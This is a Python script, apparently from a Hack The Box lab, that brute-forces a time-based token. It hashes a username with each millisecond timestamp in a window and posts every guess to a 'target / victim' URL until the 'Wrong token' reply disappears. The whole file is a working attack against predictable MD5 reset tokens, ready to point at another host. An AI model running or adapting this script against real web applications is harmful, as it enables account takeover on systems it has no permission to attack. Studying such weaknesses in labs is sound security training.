#!/usr/bin/python3

from hashlib import md5
import requests
from sys import exit
from time import time

# Change the url to your target / victim
url = "http://IP:PORT/question1/"

# To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
# Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
# stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.

now        = 1675437483000
start_time = 1675438899000 #-2 seconds
end_time   = 1675438903000 #+2 seconds
fail_text  = "Wrong token"
username   = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time + 1):
    # get token md5
    timestamp = str(x)
    md5_token = md5((username+timestamp).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()


